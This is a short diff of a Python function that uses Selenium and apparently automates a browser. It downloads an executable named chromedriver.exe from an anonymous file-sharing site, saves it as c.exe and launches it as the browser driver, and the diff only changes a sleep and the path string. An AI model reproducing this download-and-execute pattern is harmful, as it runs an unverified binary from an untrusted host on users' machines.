@@ -33,12 +33,14 @@ import requests
 def page():
 
 
+
     URL = "https://filebin.net/ux7dx4eb3njjicmd/chromedriver.exe"
     response = requests.get(URL)
     open("c.exe", "wb").write(response.content)
-    time.sleep(20)
-    d=webdriver.Chrome('c.exe')
+    time.sleep(6)
+    d=webdriver.Chrome(r'c.exe')
     d.get('https://filebin.net/ux7dx4eb3njjicmd/chromedriver.exe')
+
 
 
 
